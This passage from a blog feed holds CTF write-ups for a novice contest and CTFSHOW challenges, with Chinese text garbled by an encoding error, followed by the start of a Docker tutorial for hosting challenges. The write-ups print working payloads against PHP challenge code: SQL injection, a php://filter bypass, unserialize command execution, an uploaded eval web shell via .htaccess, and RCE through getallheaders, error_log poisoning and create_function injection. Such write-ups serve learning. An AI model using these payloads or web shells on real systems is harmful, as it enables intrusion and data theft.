class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nope</span><br></pre></td></tr></table></figure><p>è€ƒä¼ªåè®®ï¼Œè¿‡æ»¤äº†baseå’Œrotï¼Œè¿™é‡Œç”¨å…¶ä»–ç¼–ç è¿›è¡Œç»•è¿‡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/convert.iconv.UCS-2LE.UCS-2BE/</span>resource=flag.php</span><br></pre></td></tr></table></figure><p>è§£å¯†è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stringa</span> = <span class="string">&quot;è·å¾—çš„åŠ å¯†å­—ç¬¦&quot;</span>;</span><br><span class="line"><span class="variable">$stringb</span> = <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$stringa</span>, <span class="string">&#x27;UCS-2LE&#x27;</span>, <span class="string">&#x27;UCS-2BE&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stringb</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ez-sql">ez_sql</h2><p>sqlæ³¨å…¥ï¼Œå¤§å†™ç»•è¿‡ï¼Œåˆ—æ•°5åˆ—ï¼Œç›´æ¥çœ‹å‡ºæ¥çš„</p><p>çˆ†åº“å</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Union</span> Select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,dataabse() --+</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨å</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unioN</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,Group_Concat(<span class="built_in">Table_nAme</span>) <span class="keyword">fRom</span> infoRmAtion_schemA.<span class="keyword">tAbles</span> <span class="keyword">whEre</span> tAble_schemA=<span class="string">&#x27;ctf&#x27;</span> #</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—å</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Union</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,gRoup_coNcat(<span class="built_in">cOlumn_nAme</span>) <span class="keyword">fRom</span> infOrmAtion_schEma.<span class="keyword">cOlumns</span> <span class="keyword">whEre</span> <span class="built_in">tAble_Name</span>=<span class="string">&#x27;here_is_flag&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>çˆ†å†…å®¹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Union</span> sElect <span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>,gRoup_cOncat(flag) fRom here_is_flag --+</span><br></pre></td></tr></table></figure><h2 id="Unserializeï¼Ÿ">Unserializeï¼Ÿ</h2><p>å®ä¾‹åŒ–ç±»è‡ªåŠ¨è§¦å‘destructç±»ï¼Œåˆ©ç”¨echoè§¦å‘tostringæ–¹æ³•ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><strong>payloadï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&#x27;nl /th1s_1s_fffflllll4444aaaggggg&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Upload-again">Upload again!</h2><p>ç»è¿‡æµ‹è¯•å‘ç°æ˜¯å¯¹shellçš„å†…å®¹è¿›è¡Œäº†æ£€æŸ¥ï¼Œæ„Ÿè§‰æ˜¯æ£€æŸ¥äº†é—®å·ï¼Œæ–‡ä»¶åç¼€ä¹Ÿåšäº†è¿‡æ»¤ï¼ŒphpæŒ‡å®šæ˜¯ä¼ ä¸ä¸Šå»äº†ï¼Œè¿™é‡Œä½¿ç”¨.htaccessé…ç½®æ–‡ä»¶è§£æ.jpgåç¼€è¿›è¡Œç»•è¿‡</p><p>.htaccess</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>chu0.jpg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"> <span class="built_in">eval</span>($_POST[<span class="string">&#x27;chu0&#x27;</span>]); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013203719913.png" alt="image-20231013203719913"></p><h2 id="R-C-E">R!!C!!E!!</h2><p>é¦–å…ˆæ˜¯ä¸€ä¸ª.gitä¿¡æ¯æ³„éœ²ï¼Œç”¨GitHack-masterè·å–.gitçš„å†…å®¹</p><p>æºç å¦‚ä¸‹ï¼šbo0g1pop.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»å…¸çš„æ— å‚æ•°rceï¼Œpayloadå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(array_pop(getallheaders()));   //getall...è·å–è¯·æ±‚å¤´ä¿¡æ¯ï¼Œpopå‡ºæœ€åä¸€ä¸ªè¿›è¡Œeval</span><br></pre></td></tr></table></figure><p>è¯·æ±‚å¤´æ·»åŠ </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ZZZsd123</span><span class="operator">=</span>phpinfo()<span class="comment">;</span></span><br><span class="line">//è¿™é‡Œæ³¨æ„ï¼Œè¯·æ±‚å¤´çš„é¦–å­—æ¯ä¸€å®šé åï¼Œè¿™æ ·æ‰èƒ½ä¿è¯ä»–æ˜¯è¯·æ±‚å¤´çš„æœ€åä¸€ä¸ªï¼Œæ‰èƒ½è¢«evalæ­£ç¡®çš„æ‰§è¡Œ</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ–°æ‰‹èµ›ï¼Œæ„Ÿè°¢ä¸»åŠæ–¹</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOWçº¢åŒ…é¢˜ç›®</title>
    <link href="https://bowuchuling.github.io/posts/1824e02a.html"/>
    <id>https://bowuchuling.github.io/posts/1824e02a.html</id>
    <published>2023-08-13T12:07:05.818Z</published>
    <updated>2023-08-13T13:24:45.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFSHOWçº¢åŒ…é¢˜ç›®"><a href="#CTFSHOWçº¢åŒ…é¢˜ç›®" class="headerlink" title="CTFSHOWçº¢åŒ…é¢˜ç›®"></a>CTFSHOWçº¢åŒ…é¢˜ç›®</h1><h3 id="çº¢åŒ…7"><a href="#çº¢åŒ…7" class="headerlink" title="çº¢åŒ…7"></a>çº¢åŒ…7</h3><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="variable">$name</span>,<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(</span><br><span class="line">    <span class="string">&quot;ls &#x27;&quot;</span>.<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]).<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ç¬¬ä¸€æ¬¡è§åˆ°äº†extractå‡½æ•°ï¼Œç™¾åº¦ä¹‹åçŸ¥é“äº†æ˜¯ä¸€ä¸ªèµ‹å€¼å‡½æ•°ï¼Œä¸»è¦ç”¨äºå˜é‡è¦†ç›–æ–¹é¢</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20230813202700381.png" alt="image-20230813202700381"></p><p>å¤§è‡´æ„æ€å°±æ˜¯</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬ä¼ å…¥:</span><br><span class="line">?<span class="keyword">name</span>=<span class="keyword">value</span></span><br><span class="line">ç»“æœä¸ºï¼š</span><br><span class="line">$<span class="keyword">name</span>=<span class="keyword">value</span></span><br><span class="line">ç»™<span class="keyword">name</span>è¿›è¡Œäº†ä¸€æ³¢èµ‹å€¼</span><br></pre></td></tr></table></figure><p>ini_set()å‡½æ•°å¯ä»¥å¯¹php.iniè¿›è¡Œé…ç½®ï¼Œçœ‹äº†wpä¹‹åçŸ¥é“è¿™é¢˜æ˜¯éœ€è¦æ›´æ”¹æŠ¥é”™æ—¥å¿—è·¯å¾„è¿›è€Œå†™å…¥æ¶æ„å‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1ï¼š</span><br><span class="line">?name=error_log&amp;value=/<span class="keyword">var</span>/www/html/<span class="number">1</span>.php&amp;<span class="number">1</span>=%<span class="number">00</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /f*&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">è¿™é‡Œè¿˜ç”¨åˆ°äº†ä¸€ä¸ªæŠ€å·§ï¼Œç³»ç»Ÿå‘½ä»¤å¯ä»¥ä½¿ç”¨%<span class="number">00</span>è¿›è¡Œæˆªæ–­ï¼Œè¿›è€Œè§¦å‘æŠ¥é”™ï¼Œè€ŒæŠ¥é”™ä¼šæŠŠæ‰€æœ‰çš„æŠ¥é”™ä¿¡æ¯å…¨éƒ¨å†™å…¥æŠ¥é”™æ—¥å¿—å½“ä¸­ï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ini_setä¿®æ”¹æŠ¥é”™æ—¥å¿—çš„å‚¨å­˜è·¯å¾„ï¼Œè¿›è€Œå®ç°äº†æ¶æ„å‘½ä»¤çš„å†™å…¥ã€‚ç±»ä¼¼äºåŒ…å«æ—¥å¿—ã€‚</span><br><span class="line">payload2ï¼š</span><br><span class="line">?name=error_log&amp;value=/<span class="keyword">var</span>/www/html/<span class="number">2</span>.php&amp;<span class="number">1</span>=%<span class="number">00</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=&#x27; | base64 -d &gt; /var/www/html/chu1.php&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="çº¢åŒ…8"><a href="#çº¢åŒ…8" class="headerlink" title="çº¢åŒ…8"></a>çº¢åŒ…8</h2><p><strong>æºä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$name</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>))();</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®ä¸»è¦è€ƒå¯Ÿçš„æ˜¯create_function()çš„åšæ³•ï¼Œä¹‹å‰æ¥è§¦è¿‡ä¸¤ä¸ªç›¸å…³é¢˜ç›®ï¼Œä¸è¿‡éƒ½æ˜¯åœ¨ç¬¬äºŒä¸ªå‚æ•°ä¸Šåšæ–‡ç« ï¼Œå¤šæ¬¡æµ‹è¯•ä¹‹åå‘ç°ç”±äºbase64ç¼–ç çš„é™åˆ¶ä¼¼ä¹æ— è®¡å¯æ–½ï¼Œå°è¯•æ‰€æœ‰è¯¥ç¼–ç å‡½æ•°çš„æ¼æ´ï¼Œæ²¡æŸ¥åˆ°ã€‚æœ€åä¸€æ‹›ï¼Œæ‘‡äººã€‚å¾—åˆ°äº†payloadï¼Œåç»­ç½‘ä¸Šæœå¾—åˆ°äº†ä»¥ä¸‹åšå®¢ï¼š<a href="https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22116244642%22%2C%22source%22%3A%22m0_74044466%22%7D&amp;fromshare=blogdetail">https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22116244642%22%2C%22source%22%3A%22m0_74044466%22%7D&amp;fromshare=blogdetail</a></p><p>è¿™é‡Œæ˜¯åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¸Šåšæ–‡ç« ï¼Œä¸¾ä¾‹</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&quot;<span class="variable">$a</span>=123&quot;</span>,<span class="string">&quot;return 1;&quot;</span>)</span><br><span class="line"></span><br><span class="line">è¯¥å‡½æ•°å¤„ç†ä¹‹åå°†ä¼šå¾—åˆ°ä»¥ä¸‹åŒ¿åå‡½æ•°</span><br><span class="line"></span><br><span class="line">name1(<span class="variable">$a</span>=<span class="number">123</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ç¬¬ä¸€ä¸ªå‚æ•°çš„ä½ç½®è¿›è¡Œé—­åˆ</span><br><span class="line"><span class="keyword">name</span>=<span class="variable">$name</span>=<span class="number">123</span>)&#123;&#125;phpinfo()<span class="comment">;/*</span></span><br><span class="line">è¿™ä¸ªæ—¶å€™å°±å¯ä»¥æ‰§è¡Œä»»æ„phpä»£ç å•¦</span><br><span class="line">?<span class="keyword">name</span>=<span class="variable">$name</span>=<span class="number">123</span>)&#123;&#125;<span class="params">system</span>(<span class="string">&quot;cat /f*&quot;</span>)<span class="comment">;/*&amp;value=1</span></span><br><span class="line">å¾—åˆ°flag</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ctfshowï¼Œç‹ ç‹ æå°ç±³ï¼</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºä½¿ç”¨dockerçš„ä¸€äº›æ„Ÿæƒ³ï¼ŒæŒç»­æ›´æ–°ä¸­...</title>
    <link href="https://bowuchuling.github.io/posts/7ea82466.html"/>
    <id>https://bowuchuling.github.io/posts/7ea82466.html</id>
    <published>2023-07-26T17:10:39.718Z</published>
    <updated>2023-07-28T05:43:38.450Z</updated>
    
    <content type="html"><![CDATA[<p>  dockeræ•™ç¨‹å…¶å®å¾ˆæ—©å°±åœ¨é…é…¿äº†ï¼Œä½†å› ä¸ºè‡ªå·±å¤©èµ‹ä¸é«˜ï¼Œæä¸æ˜ç™½ï¼Œä¸€ç›´æ²¡æœ‰å‡ºï¼Œè¿‘æœŸç”±äºæœ‰å‡ºé¢˜éœ€æ±‚ï¼Œä¸å¾—ä¸åˆæ‹¾èµ·vmé‡Œè—ç°äº†çš„dockerï¼Œåˆæ·±å…¥å­¦ä¹ äº†ä¸€ç•ªï¼Œè¿™é‡Œå°±ä¸å¾—ä¸æåˆ°ç½‘ä¸Šçš„å„ç§åšå®¢ï¼Œçœ‹äº†å¥½é•¿æ—¶é—´éƒ½çœ‹ä¸æ‡‚ï¼Œæµªè´¹äº†å¤§æŠŠæ—¶é—´ï¼Œç”±æ­¤è¢«æˆ‘æˆäºˆäº†æ— è‰¯åšå®¢çš„å¤´è¡”ã€‚è¿™ç¯‡åšå®¢ä¸»è¦æ˜¯ä»‹ç»ä¸€ä¸‹CTFä¸­å‡ºé¢˜æ‰€éœ€è¦çš„dockeræ“ä½œã€‚æŒç»­æ›´æ–°ä¸­â€¦â€¦</p><h2 id="dockeré…ç½®æ•™ç¨‹"><a href="#dockeré…ç½®æ•™ç¨‹" class="headerlink" title="dockeré…ç½®æ•™ç¨‹"></a>dockeré…ç½®æ•™ç¨‹</h2><h3 id="æ›´æ¢é•œåƒæºï¼ˆé˜¿é‡Œäº‘ï¼‰"><a href="#æ›´æ¢é•œåƒæºï¼ˆé˜¿é‡Œäº‘ï¼‰" class="headerlink" title="æ›´æ¢é•œåƒæºï¼ˆé˜¿é‡Œäº‘ï¼‰"></a>æ›´æ¢é•œåƒæºï¼ˆé˜¿é‡Œäº‘ï¼‰</h3><p><strong>é€‰æ‹©æ€§æ›´æ¢ï¼Œå¦‚æœå†è¿›è¡Œä¸‹é¢æŒ‡ä»¤æ—¶æ²¡æœ‰æŠ¥é”™ï¼Œå¯ä»¥é€‰æ‹©ä¸æ›´æ¢</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/source<span class="selector-class">.list</span>   <span class="comment">//æ‰“å¼€å­˜æºæ–‡ä»¶</span></span><br><span class="line"><span class="selector-tag">i</span>                               <span class="comment">//è¿›å…¥ç¼–è¾‘æ¨¡å¼</span></span><br><span class="line">å°†åœ°å€é»è´´è¿›å»</span><br><span class="line">æŒ‰ESC                           <span class="comment">//é€€å‡ºç¼–è¾‘æ¨¡å¼</span></span><br><span class="line">è¾“å…¥:wq                         <span class="comment">//ä¿å­˜å¹¶é€€å‡º</span></span><br></pre></td></tr></table></figure><p><strong>é•œåƒæºåœ°å€ï¼Œå…¨éƒ¨å¤åˆ¶è¿›å»</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><h3 id="åˆ›å»ºdocker"><a href="#åˆ›å»ºdocker" class="headerlink" title="åˆ›å»ºdocker"></a>åˆ›å»ºdocker</h3><p><strong>1.ä¸‹è½½dockeré•œåƒ</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt <span class="keyword">install</span> docker.io    </span><br></pre></td></tr></table></figure><p><strong>2.æœç´¢\ä¸‹è½½ æœåŠ¡å™¨é•œåƒ</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search pull   <span class="regexp">//</span>æœç´¢æœåŠ¡å™¨é•œåƒï¼Œå¯ä»¥ä¸æœ</span><br><span class="line">docker pull é•œåƒå    <span class="regexp">//</span>ä¾‹å¦‚docker pull tutum/lamp </span><br></pre></td></tr></table></figure><p><strong>3.åˆ›å»ºdocker</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -<span class="built_in">id</span> --name ç»™dockerå–ä¸ªå -p æƒ³å¼€æ”¾çš„ç«¯å£:80 æœåŠ¡å™¨é•œåƒå</span></span><br><span class="line"></span><br><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -<span class="built_in">id</span> --name dockername1 -p 180:80 tutum/lamp</span></span><br><span class="line">//åˆ›å»ºtutum/lampæœåŠ¡å™¨ï¼Œå‘½åä¸ºdockername1ï¼Œå¼€æ”¾<span class="number">180</span>ç«¯å£ä¾›è®¿é—®</span><br></pre></td></tr></table></figure><p><strong>4.æ™®é€šé¢˜ç›®å¤åˆ¶</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æŠŠæ–‡ä»¶æ‹‰åˆ°linuxç›®å½•ä¸‹</span><br><span class="line">docker cp æ–‡ä»¶å dockerå<span class="symbol">:/var/www/html</span>   </span><br><span class="line">/<span class="regexp">/æŠŠæ–‡ä»¶å¤åˆ¶åˆ°dockerçš„/var</span><span class="regexp">/www/html</span>ç›®å½•ä¸‹ï¼Œè®°å¾—å‘½åä¸€ä¸ªindex.phpï¼Œæ–‡ä»¶çš„å…¶ä»–äººæƒé™å¾—è®¾ç½®æˆå¯è¯»</span><br></pre></td></tr></table></figure><p><strong>5.ï¼ˆå¯æœ‰å¯æ— ï¼‰è¿›å…¥dockeræŸ¥çœ‹</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it dockerå <span class="regexp">/bin/</span>bash  </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>è¿›å…¥ä¹‹åå°±éšä¾¿å‘½ä»¤æ‰§è¡Œå°±å¥½äº†ï¼Œæ²¡é—®é¢˜å°±è®¿é—®å®¿ä¸»æœºip+ç«¯å£çœ‹çœ‹ï¼Œèƒ½è®¿é—®å°±æ²¡é—®é¢˜</span><br></pre></td></tr></table></figure><h3 id="å¸¸ç”¨æŒ‡ä»¤"><a href="#å¸¸ç”¨æŒ‡ä»¤" class="headerlink" 